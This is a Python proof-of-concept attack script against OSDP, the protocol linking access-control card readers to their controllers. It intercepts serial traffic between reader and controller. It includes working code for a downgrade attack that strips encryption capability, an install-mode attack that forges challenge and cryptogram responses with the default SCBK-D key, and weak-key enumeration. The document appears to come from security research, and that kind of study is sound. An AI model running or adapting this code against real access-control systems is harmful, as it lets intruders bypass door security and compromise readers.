#!/usr/bin/env python3

import serial
import argparse
from termcolor import colored
import secrets

import osdptools

# Attack 1: Maybe the data isn't encrypted in the first place.
#           1a: Some SC messages are only MAC-protected, not encrypted!
# Attack 2: Downgrade the connection to not encrypted. (Advertise capability w/ no crypto) 
# #         2a: TODO Reply to secure block packet with NAK type 5
# Attack 3: Install-mode attack. Tell controller that the reader forgot the key. Will it resend?
# Attack 4: Bad / default key. Might be using SCBK-D (built in default key). Or alternatively, common changeme keys (01234567...)
# Attack 5: Intercept initial osdp_KEYSET message. (reset / break / replace reader in some way) (Use mode #3)

parser = argparse.ArgumentParser(
                    prog = 'attack_osdp.py',
                    description = 'PoC attack script against OSDP')
parser.add_argument('-2', '--downgrade',
                    action='store_true')
parser.add_argument('-3', '--install',
                    action='store_true')
parser.add_argument('-4', '--weakkey',
                    action='store_true')
parser.add_argument('-r', '--reader', default="/dev/ttyUSB0")
parser.add_argument('-c', '--controller', default="/dev/ttyUSB1")
parser.add_argument('-a', '--address', type=int, default=4)
args = parser.parse_args()


# Key material gathered during key exchange
keymaterial = osdptools.KeyMaterial()
forged_challenge_response = None

with serial.Serial(args.reader, 9600, timeout=None) as pd:
    with serial.Serial(args.controller, 9600, timeout=None) as cp:
        while True:
            cp_header = osdptools.OSDPHeader()
            cp_header.readFromSerial(cp)
            cp_packet = osdptools.OSDPPacket(cp_header)
            cp_packet.readFromSerial(cp)

            cp_packet.printCommandDebug()

            # Only bother processing for our reader's address
            if cp_header.address != args.address:
                continue

            if cp_packet.command == 0x75:
                if keymaterial.session_key == b'':
                    keymaterial.session_key = osdptools.SCBKD
                print(cp_packet.payload, keymaterial.session_key, keymaterial.mac_I)

            # Capture the initial key exchange material
            if cp_packet.command == 0x76:
                keymaterial.controller_rng = cp_packet.rng
            if args.install and cp_packet.command == 0x76:
                keymaterial.controller_rng = keymaterial.controller_rng
                session_key = osdptools.derive_session_key(keymaterial.controller_rng, osdptools.SCBKD, "s_enc")
                keymaterial.session_key = session_key
                client_rng = secrets.token_bytes(8)
                cryptogram = osdptools.calculate_cryptogram(keymaterial.controller_rng, client_rng, session_key)
                forged_challenge_response = osdptools.forgeCryptogramResponse(cp_header.sequence_number, keymaterial.client_id, client_rng, cryptogram)
            if args.install and cp_packet.command == 0x77:
                keymaterial.controller_cryptogram = cp_packet.cryptogram
                forged_challenge_response = osdptools.forgeMACResponse(cp_header.sequence_number, keymaterial)

            # Forward on the controller's packet unchanged
            print("write to pd")
            pd.write(cp_packet.getPayload())

            # Now listen for the reader's response
            pd_header = osdptools.OSDPHeader()
            pd_header.readFromSerial(pd)
            pd_packet = osdptools.OSDPPacket(pd_header)
            pd_packet.readFromSerial(pd)

            if forged_challenge_response is None:
                pd_packet.printCommandDebug()

            # Capture the initial key exchange material
            if pd_packet.secure_block_type == 0x12:
                keymaterial.client_rng = pd_packet.rng
                keymaterial.client_id = pd_packet.client_id
                keymaterial.client_cryptogram = pd_packet.cryptogram

            # Test challenge response for weak keys
            if args.weakkey and pd_packet.secure_block_type == 0x12:
                print(colored("Testing key exchange for weak keys...", "yellow"))
                key = osdptools.enumerateWeakKeys(keymaterial.controller_rng, keymaterial.client_rng, keymaterial.client_cryptogram)
                if len(key) > 0:
                    print(colored("Weak Key Found: " + str(key), "green"))
                else:
                    print(colored("No Weak Key", "red"))

            # Modify this challenge response to use SCBK-D instead
            if args.install and forged_challenge_response is not None:
                print(colored("Trying install-mode switch to SCBK-D...", "yellow"))
                cp.write(forged_challenge_response)
                forged_challenge_response = None
                continue

            # Downgrade the capabilities of the reader to not support encryption
            if args.downgrade and pd_packet.command == 0x46:
                print(colored("Trying downgrade attack...", "yellow"))
                pd_packet.downgrade()

            print("write to cp")
            cp.write(pd_packet.getPayload())
